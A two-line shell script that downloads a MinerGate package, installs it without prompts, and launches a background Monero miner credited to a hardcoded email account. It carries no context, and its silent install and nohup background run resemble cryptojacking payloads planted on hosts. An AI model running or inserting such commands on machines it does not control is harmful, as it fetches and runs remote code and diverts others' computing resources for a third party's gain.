wget https://minergate.com/download/xfast-ubuntu-cli-amd && mv xfast-ubuntu-cli-amd minergate-cli-release.deb && apt-get -y update && apt-get -y install gdebi && yes Y | gdebi minergate-cli-release.deb
nohup minergate-cli -u mgrate888@gmail.com --xmr &>a & &>b
